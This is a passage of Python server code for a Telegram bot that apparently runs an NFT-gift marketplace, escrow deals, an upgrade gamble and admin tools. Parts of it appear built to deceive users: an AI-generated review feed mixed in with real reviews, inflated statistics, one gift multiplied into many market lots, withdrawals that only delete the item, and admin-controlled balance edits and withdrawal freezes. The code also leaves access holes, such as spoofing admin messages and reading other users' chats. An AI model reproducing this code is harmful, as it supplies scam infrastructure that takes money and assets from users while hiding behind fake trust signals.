        if completed_cnt < 2 and not is_admin(user_id):
            return web.json_response({
                "success": False,
                "error": "Покупка подарков на маркете доступна только от 2 завершённых сделок"
            }, headers=headers)

        item_id = data.get("item_id")
        currency = (data.get("currency") or "STARS").upper()

        all_items = market_data.get("items", [])
        idx = next((i for i, x in enumerate(all_items) if x.get("id") == item_id), None)
        if idx is None:
            return web.json_response({"success": False, "error": "Этот подарок уже купили"}, headers=headers)

        target_item = all_items[idx]
        st_price = float(target_item.get("stars_price") or target_item.get("prices", {}).get("STARS") or 100)
        actual_prices = calc_prices_from_stars(st_price)
        price = actual_prices.get(currency)

        if not price:
            return web.json_response({"success": False, "error": "Неверная валюта"}, headers=headers)

        bal = get_balance(user_id)
        curr_low = currency.lower()
        if bal.get(curr_low, 0) < price:
            return web.json_response({"success": False, "error": f"Недостаточно {currency} на балансе"}, headers=headers)

        bal[curr_low] = round(bal[curr_low] - price, 4)
        save_json(FILES["balance"], balance)

        seller_uid = target_item.get("seller_id")
        if seller_uid and str(seller_uid) != str(user_id):
            payout = round(price * 0.95, 4)
            add_balance(seller_uid, currency, payout)
            try:
                await bot.send_message(
                    int(seller_uid),
                    f"<b>Ваш NFT продан на маркете {BOT_NAME}!</b>\n\n"
                    f"Подарок: <b>{target_item['name']} #{target_item['number']}</b>\n"
                    f"Зачислено (с учётом комиссии 5%): <b>{payout} {currency}</b>"
                )
            except Exception:
                pass

        all_items.pop(idx)
        save_json(FILES["market"], market_data)

        inv_entry = {
            "inv_id": "inv_" + str(uuid.uuid4())[:8],
            "url": target_item["url"],
            "slug": target_item["slug"],
            "collection": target_item.get("collection") or target_item["name"],
            "name": target_item["name"],
            "number": target_item["number"],
            "model": target_item.get("model", "Original"),
            "backdrop": target_item.get("backdrop", "Arctic"),
            "symbol": target_item.get("symbol", "Star"),
            "image_url": target_item["image_url"],
            "stars_price": int(round(st_price)),
            "bought_at": datetime.now().isoformat()
        }
        get_user_inventory(user_id).insert(0, inv_entry)
        save_json(FILES["inventory"], inventory_data)

        await notify_admins(
            f"<b>Покупка на маркете</b>\n"
            f"Покупатель: @{username or user_id} (ID: <code>{user_id}</code>)\n"
            f"NFT: <b>{target_item['name']} #{target_item['number']}</b> ({target_item.get('model')})\n"
            f"Оплачено: <b>{price} {currency}</b>"
        )

        return web.json_response({"success": True, "item": inv_entry}, headers=headers)

    # ------------------------------------------------------------
    # ИНВЕНТАРЬ
    # ------------------------------------------------------------
    elif endpoint == "/api/inventory":
        if not user_id:
            return web.json_response({"success": False, "error": "user_id required"}, headers=headers)
        items = get_user_inventory(user_id)
        enriched = []
        for it in items:
            itc = it.copy()
            itc["prices"] = calc_prices_from_stars(itc.get("stars_price", 100))
            enriched.append(itc)
        return web.json_response({"success": True, "items": enriched}, headers=headers)

    elif endpoint == "/api/inventory_withdraw":
        if not user_id:
            return web.json_response({"success": False}, headers=headers)
        inv_id = data.get("inv_id")
        inv_list = get_user_inventory(user_id)
        idx = next((i for i, x in enumerate(inv_list) if x.get("inv_id") == inv_id), None)
        if idx is None:
            return web.json_response({"success": False, "error": "Предмет не найден"}, headers=headers)

        item = inv_list.pop(idx)
        save_json(FILES["inventory"], inventory_data)

        await notify_admins(
            f"<b>Заявка на вывод NFT из инвентаря</b>\n\n"
            f"Пользователь: @{username or user_id} (ID: <code>{user_id}</code>)\n"
            f"NFT: <b>{item['name']} #{item['number']}</b> ({item.get('model')})\n"
            f"Ссылка: {item['url']}"
        )

        return web.json_response({"success": True, "message": "Ожидайте получение NFT"}, headers=headers)

    elif endpoint == "/api/inventory_sell":
        if not user_id:
            return web.json_response({"success": False}, headers=headers)
        inv_id = data.get("inv_id")
        stars_price = float(data.get("stars_price") or 0)
        if stars_price < 10:
            return web.json_response({"success": False, "error": "Минимальная цена — 10 STARS"}, headers=headers)

        inv_list = get_user_inventory(user_id)
        idx = next((i for i, x in enumerate(inv_list) if x.get("inv_id") == inv_id), None)
        if idx is None:
            return web.json_response({"success": False, "error": "Предмет не найден"}, headers=headers)

        item = inv_list.pop(idx)
        save_json(FILES["inventory"], inventory_data)

        prices = calc_prices_from_stars(stars_price)
        mkt_item = {
            "id": "usr_" + str(uuid.uuid4())[:8],
            "url": item["url"],
            "slug": item["slug"],
            "collection": item.get("collection") or item["name"],
            "name": item["name"],
            "number": item["number"],
            "model": item.get("model", "Original"),
            "backdrop": item.get("backdrop", "Arctic"),
            "symbol": item.get("symbol", "Star"),
            "image_url": item["image_url"],
            "stars_price": int(round(stars_price)),
            "prices": prices,
            "seller_id": user_id,
            "source": "user_listing",
            "created_at": datetime.now().isoformat()
        }
        market_data.setdefault("items", []).insert(0, mkt_item)
        save_json(FILES["market"], market_data)

        return web.json_response({"success": True, "item": mkt_item}, headers=headers)

    # ------------------------------------------------------------
    # АПГРЕЙД (ШАНС ОТ 5% ДО 75%)
    # ------------------------------------------------------------
    elif endpoint == "/api/upgrade_spin":
        if not user_id:
            return web.json_response({"success": False, "error": "Требуется авторизация"}, headers=headers)

        stake_type = data.get("stake_type")
        target_id = data.get("target_id")

        all_mkt = market_data.get("items", [])
        target_idx = next((i for i, x in enumerate(all_mkt) if x.get("id") == target_id), None)
        if target_idx is None:
            return web.json_response({"success": False, "error": "Выбранный целевой NFT уже недоступен"}, headers=headers)

        target_item = all_mkt[target_idx]
        target_stars = float(target_item.get("stars_price") or target_item.get("prices", {}).get("STARS") or 100)

        stake_stars = 0.0
        staked_inv_item = None

        if stake_type == "inventory":
            inv_id = data.get("inv_id")
            inv_list = get_user_inventory(user_id)
            inv_idx = next((i for i, x in enumerate(inv_list) if x.get("inv_id") == inv_id), None)
            if inv_idx is None:
                return web.json_response({"success": False, "error": "Выбранный NFT не найден в инвентаре"}, headers=headers)
            staked_inv_item = inv_list[inv_idx]
            stake_stars = float(staked_inv_item.get("stars_price") or 100)
        elif stake_type == "balance":
            curr = (data.get("currency") or "STARS").upper()
            amt = float(data.get("amount") or 0)
            if amt <= 0:
                return web.json_response({"success": False, "error": "Укажите сумму ставки"}, headers=headers)
            bal = get_balance(user_id)
            if bal.get(curr.lower(), 0) < amt:
                return web.json_response({"success": False, "error": f"Недостаточно {curr} на балансе"}, headers=headers)
            stake_stars = convert_currency_to_stars(amt, curr)
        else:
            return web.json_response({"success": False, "error": "Неверный тип ставки"}, headers=headers)

        chance = round((stake_stars / max(1.0, target_stars)) * 100.0, 2)
        if chance < 5.0 or chance > 75.0:
            return web.json_response({
                "success": False,
                "error": f"Шанс апгрейда ({chance}%) должен быть в пределах от 5% до 75%"
            }, headers=headers)

        if stake_type == "inventory":
            inv_list = get_user_inventory(user_id)
            inv_list.remove(staked_inv_item)
            save_json(FILES["inventory"], inventory_data)
        else:
            curr = (data.get("currency") or "STARS").upper()
            amt = float(data.get("amount") or 0)
            bal = get_balance(user_id)
            bal[curr.lower()] = round(bal[curr.lower()] - amt, 4)
            save_json(FILES["balance"], balance)

        roll = round(random.uniform(0.0, 100.0), 2)
        won = roll < chance

        won_inv_item = None
        if won:
            all_mkt.pop(target_idx)
            save_json(FILES["market"], market_data)

            won_inv_item = {
                "inv_id": "inv_" + str(uuid.uuid4())[:8],
                "url": target_item["url"],
                "slug": target_item["slug"],
                "collection": target_item.get("collection") or target_item["name"],
                "name": target_item["name"],
                "number": target_item["number"],
                "model": target_item.get("model", "Original"),
                "backdrop": target_item.get("backdrop", "Arctic"),
                "symbol": target_item.get("symbol", "Star"),
                "image_url": target_item["image_url"],
                "stars_price": int(round(target_stars)),
                "bought_at": datetime.now().isoformat()
            }
            get_user_inventory(user_id).insert(0, won_inv_item)
            save_json(FILES["inventory"], inventory_data)

        return web.json_response({
            "success": True,
            "won": won,
            "chance": chance,
            "roll": roll,
            "won_item": won_inv_item
        }, headers=headers)

    # ------------------------------------------------------------
    # АДМИН-УПРАВЛЕНИЕ МАРКЕТОМ И STRING SESSION
    # ------------------------------------------------------------
    elif endpoint == "/api/admin_market_add":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        nft_link = (data.get("nft_link") or "").strip()
        stars_price = float(data.get("stars_price") or 0)
        lots_count = max(1, min(50, int(data.get("lots_count") or 15)))

        if not nft_link or stars_price <= 0:
            return web.json_response({"success": False, "error": "Укажите ссылку на NFT и базовую цену в STARS"}, headers=headers)

        meta = await fetch_nft_metadata_from_web(nft_link)
        if not meta:
            return web.json_response({"success": False, "error": "Неверный формат ссылки. Пример: t.me/nft/PlushPepe-120"}, headers=headers)

        new_lots = expand_gift_into_market_lots(
            base_slug=meta["slug"],
            readable_name=meta["name"],
            sample_num=meta["number"],
            base_stars=int(round(stars_price)),
            model_name=meta["model"],
            backdrop_name=meta["backdrop"],
            symbol_name=meta["symbol"],
            lots_count=lots_count
        )
        for lot in new_lots:
            market_data.setdefault("items", []).insert(0, lot)
        random.shuffle(market_data["items"])
        save_json(FILES["market"], market_data)
        return web.json_response({"success": True, "added": len(new_lots)}, headers=headers)

    elif endpoint == "/api/admin_market_delete":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        mid = data.get("item_id")
        market_data["items"] = [x for x in market_data.get("items", []) if x.get("id") != mid]
        save_json(FILES["market"], market_data)
        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/admin_session_control":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        action = data.get("action")
        if action == "save":
            sess = (data.get("string_session") or "").strip()
            if sess:
                telethon_cfg["string_session"] = sess
                telethon_cfg["auto_parse"] = True
            save_json(FILES["telethon_cfg"], telethon_cfg)
            return web.json_response({"success": True}, headers=headers)
        elif action == "parse_now":
            res = await parse_telegram_star_market_via_session(lots_per_model=16)
            return web.json_response(res, headers=headers)

    # ------------------------------------------------------------
    # ОТЗЫВЫ
    # ------------------------------------------------------------
    elif endpoint == "/api/reviews":
        can_review = count_user_completed_deals(user_id, username) >= 1 or is_admin(user_id)
        curr_filter = (data.get("currency") or "ALL").upper()
        all_items = reviews_data.get("items", [])

        if curr_filter != "ALL":
            filtered = [r for r in all_items if (r.get("currency") or "").upper() == curr_filter]
        else:
            filtered = all_items

        total_count = len(all_items)
        avg_rating = round(sum(r.get("rating", 5) for r in all_items) / total_count, 1) if total_count else 5.0

        return web.json_response({
            "success": True,
            "reviews": filtered[:100],
            "total_count": total_count,
            "filtered_count": len(filtered),
            "avg_rating": avg_rating,
            "can_review": can_review
        }, headers=headers)

    elif endpoint == "/api/add_review":
        if not user_id:
            return web.json_response({"success": False, "error": "Требуется авторизация"}, headers=headers)

        if not (count_user_completed_deals(user_id, username) >= 1 or is_admin(user_id)):
            return web.json_response({
                "success": False,
                "error": "Оставить отзыв можно только после завершения хотя бы 1 сделки"
            }, headers=headers)

        text = (data.get("text") or "").strip()
        rating = max(1, min(5, int(data.get("rating") or 5)))
        category = data.get("category") or "nft_gift"
        cat_labels = {
            "nft_gift": "NFT / Telegram Gift",
            "game_account": "Игровой аккаунт",
            "other": "Цифровой товар"
        }
        currency = (data.get("currency") or "TON").upper()
        try:
            amount = float(data.get("amount") or 0)
        except (TypeError, ValueError):
            amount = 0

        if amount <= 0:
            return web.json_response({"success": False, "error": "Укажите сумму сделки"}, headers=headers)
        if len(text) < 4:
            return web.json_response({"success": False, "error": "Напишите текст отзыва"}, headers=headers)

        entry = {
            "id": "rev_" + str(uuid.uuid4())[:8],
            "author_ru": "Анонимный пользователь",
            "author_en": "Anonymous user",
            "rating": rating,
            "category": category,
            "category_label": cat_labels.get(category, "NFT / Telegram Gift"),
            "currency": currency,
            "amount": int(amount) if amount.is_integer() else round(amount, 2),
            "text": text[:500],
            "date": datetime.now().isoformat(),
            "source": "user"
        }
        reviews_data["items"].insert(0, entry)
        save_json(FILES["reviews"], reviews_data)
        return web.json_response({"success": True, "review": entry}, headers=headers)

    elif endpoint == "/api/admin_ai_control":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        action = data.get("action")
        if action == "toggle":
            ai_state["enabled"] = not bool(ai_state.get("enabled"))
            save_json(FILES["ai_state"], ai_state)
        elif action == "generate_now":
            entry = await generate_ai_review_entry()
            if not entry:
                return web.json_response({"success": False, "error": "Не удалось сгенерировать отзыв"}, headers=headers)
        elif action == "delete_review":
            rid = data.get("review_id")
            reviews_data["items"] = [r for r in reviews_data.get("items", []) if r.get("id") != rid]
            save_json(FILES["reviews"], reviews_data)

        return web.json_response({
            "success": True,
            "ai_enabled": bool(ai_state.get("enabled")),
            "last_model": ai_state.get("last_model"),
            "reviews": reviews_data.get("items", [])[:60]
        }, headers=headers)

    # ------------------------------------------------------------
    # СДЕЛКИ (КОМИССИЯ 0%)
    # ------------------------------------------------------------
    elif endpoint == "/api/create_deal":
        product = (data.get("product") or "").strip()
        currency = (data.get("currency") or "TON").upper()
        amount = data.get("amount")
        partner = (data.get("partner_username") or "").replace("@", "").strip()
        creator_role = data.get("creator_role", "seller")
        category = data.get("category", "nft_gift")
        raw_nft_link = (data.get("nft_link") or "").strip()

        if not all([user_id, product, currency, amount, partner]):
            return web.json_response({"success": False, "error": "Заполните все поля"}, headers=headers)

        parsed_nft = None
        if category == "nft_gift":
            parsed_nft = parse_nft_link(raw_nft_link)
            if not parsed_nft:
                return web.json_response({
                    "success": False,
                    "error": "Неверный формат ссылки NFT. Пример: t.me/nft/PlushPepe-120"
                }, headers=headers)
        elif raw_nft_link:
            parsed_nft = parse_nft_link(raw_nft_link)

        nft_url = parsed_nft["url"] if parsed_nft else None

        creator_uname = (username or str(user_id)).lower()
        if creator_role == "buyer":
            seller_id, seller_username = None, partner.lower()
            buyer_id, buyer_username = user_id, creator_uname
            buyer_joined, seller_joined = True, False
        else:
            seller_id, seller_username = user_id, creator_uname
            buyer_id, buyer_username = None, partner.lower()
            seller_joined, buyer_joined = True, False

        deal_id = str(uuid.uuid4())[:8]
        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

        deals[deal_id] = {
            "deal_id": deal_id,
            "creator_role": creator_role,
            "seller_id": seller_id,
            "seller_username": seller_username,
            "buyer_id": buyer_id,
            "buyer_username": buyer_username,
            "seller_joined": seller_joined,
            "buyer_joined": buyer_joined,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "category": category,
            "nft_link": nft_url,
            "nft_name": parsed_nft["name"] if parsed_nft else None,
            "nft_number": parsed_nft["number"] if parsed_nft else None,
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "completed_at": None
        }
        save_json(FILES["deals"], deals)

        try:
            share_text = (
                f"Сделка #{deal_id} в {BOT_NAME}\n"
                f"Товар: {product} ({amount} {currency})\n"
                f"Войти в сделку: {link}"
            )
            share_url = f"https://t.me/share/url?url={quote(link)}&text={quote(share_text)}"
            nft_line = (
                f'NFT: <a href="{nft_url}">{parsed_nft["name"]} #{parsed_nft["number"]}</a>\n'
                if parsed_nft else ""
            )

            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Переслать ссылку участнику", url=share_url)],
                [InlineKeyboardButton(text="Открыть сделку", web_app=WebAppInfo(url=build_webapp_url(user_id, page="deals", deal_id=deal_id)))]
            ])
            await bot.send_message(
                int(user_id),
                f'<b>Сделка <a href="{link}">#{deal_id}</a> создана</b>\n\n'
                f"Товар: <b>{product}</b>\n"
                f"Сумма: <b>{amount} {currency}</b>\n"
                f"Продавец: @{seller_username}\n"
                f"Покупатель: @{buyer_username}\n"
                f"{nft_line}\n"
                f'Передайте <a href="{link}">ссылку на сделку</a> второму участнику (оплата откроется после входа обоих):\n'
                f"<code>{link}</code>",
                reply_markup=kb,
                disable_web_page_preview=True
            )
        except Exception:
            pass

        nft_admin_block = (
            f'\nNFT: <a href="{nft_url}">{parsed_nft["name"]} #{parsed_nft["number"]}</a>'
            if parsed_nft else ""
        )
        await notify_admins(
            f'<b>Новая сделка <a href="{link}">#{deal_id}</a></b>\n\n'
            f"Создатель: @{creator_uname} (ID: <code>{user_id}</code>)\n"
            f"Продавец: @{seller_username}\n"
            f"Покупатель: @{buyer_username}\n"
            f"Товар: <b>{product}</b>\n"
            f"Сумма: <b>{amount} {currency}</b>"
            f"{nft_admin_block}"
        )

        return web.json_response({"success": True, "deal_id": deal_id, "link": link, "deal": deals[deal_id]}, headers=headers)

    elif endpoint == "/api/deals":
        if not user_id:
            return web.json_response({"success": False, "error": "user_id required"}, headers=headers)
        uname_low = username.lower()
        res_list = []
        for d_id, d in deals.items():
            if (
                d.get("seller_id") == user_id
                or d.get("buyer_id") == user_id
                or (uname_low and d.get("seller_username", "").lower() == uname_low)
                or (uname_low and d.get("buyer_username", "").lower() == uname_low)
            ):
                d_copy = d.copy()
                d_copy["deal_id"] = d_id
                res_list.append(d_copy)
        return web.json_response({"success": True, "deals": list(reversed(res_list))}, headers=headers)

    elif endpoint == "/api/pay_balance":
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]

        if not (deal.get("buyer_joined") and deal.get("seller_joined")):
            return web.json_response({
                "success": False,
                "error": "Оплата заблокирована: оба участника должны сначала зайти в сделку по ссылке"
            }, headers=headers)

        if deal["status"] != "waiting_payment":
            return web.json_response({"success": False, "error": "Сделка уже оплачена"}, headers=headers)

        bal = get_balance(user_id)
        curr = deal["currency"].lower()
        if bal.get(curr, 0) < deal["amount"]:
            return web.json_response({"success": False, "error": f"Недостаточно {deal['currency']} на балансе"}, headers=headers)

        bal[curr] = round(bal[curr] - deal["amount"], 4)
        save_json(FILES["balance"], balance)

        deal["status"] = "paid"
        deal["buyer_id"] = user_id
        save_json(FILES["deals"], deals)

        if deal.get("seller_id"):
            try:
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="Передать подарок", url=f"tg://send_gift?to={ESCROW_ACCOUNT}")],
                    [InlineKeyboardButton(text="Открыть сделки", web_app=WebAppInfo(url=build_webapp_url(deal["seller_id"], page="deals")))]
                ])
                await bot.send_message(
                    deal["seller_id"],
                    f"<b>Сделка #{deal_id} оплачена</b>\n\n"
                    f"Товар: {deal['product']}\n"
                    f"Сумма: {deal['amount']} {deal['currency']}\n"
                    f"Передайте подарок на @{ESCROW_ACCOUNT} и подтвердите передачу в приложении.",
                    reply_markup=kb
                )
            except Exception:
                pass

        return web.json_response({"success": True}, headers=headers)

    elif endpoint in ("/api/seller_delivered", "/api/transfer_nft"):
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "paid":
            return web.json_response({"success": False, "error": "Сделка не оплачена"}, headers=headers)
        deal["status"] = "awaiting_confirmation"
        deal["seller_id"] = user_id
        save_json(FILES["deals"], deals)

        if deal.get("buyer_id"):
            try:
                await bot.send_message(
                    deal["buyer_id"],
                    f"<b>Продавец передал товар по сделке #{deal_id}</b>\n\nПодтвердите получение в приложении.",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Подтвердить получение", web_app=WebAppInfo(url=build_webapp_url(deal["buyer_id"], page="deals")))]
                    ])
                )
            except Exception:
                pass
        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/buyer_confirm":
        deal_id = data.get("deal_id")
        if deal_id not in deals:
            return web.json_response({"success": False, "error": "Сделка не найдена"}, headers=headers)
        deal = deals[deal_id]
        if deal["status"] != "awaiting_confirmation":
            return web.json_response({"success": False, "error": "Неверный статус сделки"}, headers=headers)

        if deal.get("seller_id"):
            add_balance(deal["seller_id"], deal["currency"], deal["amount"])
            try:
                await bot.send_message(
                    deal["seller_id"],
                    f"<b>Сделка #{deal_id} завершена</b>\nЗачислено: {deal['amount']} {deal['currency']} (комиссия 0%)."
                )
            except Exception:
                pass

        deal["status"] = "completed"
        deal["completed_at"] = datetime.now().isoformat()
        save_json(FILES["deals"], deals)
        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/chat_history":
        uid_str = str(data.get("target_user_id") or user_id)
        msgs = chat_messages.get(uid_str, [])
        if is_admin(user_id) and data.get("target_user_id"):
            changed = False
            for m in msgs:
                if m.get("sender") == "user" and not m.get("read"):
                    m["read"] = True
                    changed = True
            if changed:
                save_json(FILES["chat_messages"], chat_messages)
        return web.json_response({"success": True, "messages": msgs}, headers=headers)

    elif endpoint == "/api/chat_send":
        uid_str = str(data.get("target_user_id") or user_id)
        text = (data.get("text") or "").strip()
        sender = data.get("sender", "user")
        if not uid_str or not text:
            return web.json_response({"success": False, "error": "Пустое сообщение"}, headers=headers)

        chat_messages.setdefault(uid_str, []).append({
            "id": "m" + str(uuid.uuid4())[:8],
            "text": text,
            "sender": sender,
            "username": username or uid_str,
            "timestamp": datetime.now().isoformat(),
            "read": sender == "admin"
        })
        save_json(FILES["chat_messages"], chat_messages)

        if sender == "user":
            await notify_admins(
                f"<b>Сообщение в чат поддержки</b>\n"
                f"От: @{username or uid_str} (ID: <code>{uid_str}</code>)\n"
                f"Текст: {text}\n\n"
                f"Ответить: <code>/chat_reply {uid_str} ваш ответ</code>"
            )
        else:
            try:
                await bot.send_message(
                    int(uid_str),
                    f"<b>Ответ поддержки {BOT_NAME}:</b>\n\n{text}",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Открыть чат", web_app=WebAppInfo(url=build_webapp_url(int(uid_str), page="support")))]
                    ])
                )
            except Exception:
                pass

        return web.json_response({"success": True}, headers=headers)

    elif endpoint == "/api/admin_panel_data":
        if not is_admin(user_id):
            return web.json_response({"success": False, "error": "Admin required"}, headers=headers)
        return web.json_response({
            "success": True,
            "deals": list(reversed(list(deals.values())))[:50],
            "chats": chat_messages,
            "ai_enabled": bool(ai_state.get("enabled")),
            "last_model": ai_state.get("last_model"),
            "reviews": reviews_data.get("items", [])[:60],
            "market": market_data.get("items", [])[:80],
            "market_total": len(market_data.get("items", [])),
            "session_connected": bool(telethon_cfg.get("string_session"))
        }, headers=headers)

    elif endpoint == "/api/admin_delete_deal":
        if is_admin(user_id) and data.get("deal_id") in deals:
            del deals[data["deal_id"]]
            save_json(FILES["deals"], deals)
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_add_balance":
        if is_admin(user_id):
            add_balance(data.get("target_user_id"), data.get("currency", "TON"), float(data.get("amount", 0)))
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_set_balance":
        if is_admin(user_id):
            set_balance(data.get("target_user_id"), data.get("currency", "TON"), float(data.get("amount", 0)))
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_remove_balance":
        if is_admin(user_id):
            tid = str(data.get("target_user_id"))
            curr = data.get("currency", "TON").lower()
            bal = get_balance(tid)
            bal[curr] = max(0, round(bal.get(curr, 0) - float(data.get("amount", 0)), 4))
            save_json(FILES["balance"], balance)
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_set_freeze":
        if is_admin(user_id):
            tid = str(data.get("target_user_id"))
            mins = int(data.get("minutes") or 0)
            if mins <= 0:
                freeze_data.pop(tid, None)
            else:
                freeze_data[tid] = {
                    "until": int(datetime.now().timestamp() * 1000) + mins * 60000,
                    "reason": data.get("reason") or "Ограничение вывода"
                }
            save_json(FILES["freeze"], freeze_data)
            return web.json_response({"success": True}, headers=headers)
        return web.json_response({"success": False}, headers=headers)

    elif endpoint == "/api/admin_get_freeze":
        tid = str(data.get("target_user_id") or user_id)
        fr = freeze_data.get(tid)
        if not fr or datetime.now().timestamp() * 1000 > fr.get("until", 0):
            return web.json_response({"success": True, "frozen": False}, headers=headers)
        return web.json_response({"success": True, "frozen": True, "until": fr["until"], "reason": fr.get("reason", "")}, headers=headers)

    return web.json_response({"success": False, "error": "Unknown endpoint"}, headers=headers)

# ============================================================
# 14. ЗАПУСК И КОРРЕКТНОЕ ЗАВЕРШЕНИЕ
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route("*", "/{path:.*}", handle_web_request)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"Сервер {BOT_NAME} запущен на порту {PORT}")

async def main():
    asyncio.create_task(rates_background_loop())
    asyncio.create_task(auto_increment_stats())
    asyncio.create_task(ai_reviews_background_loop())
    asyncio.create_task(telegram_market_auto_loop())
    await start_web_server()
    try:
        await dp.start_polling(bot)
    finally:
        flush_all_data()

if __name__ == "__main__":
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, lambda *_: flush_all_data())
        except Exception:
            pass
    asyncio.run(main())
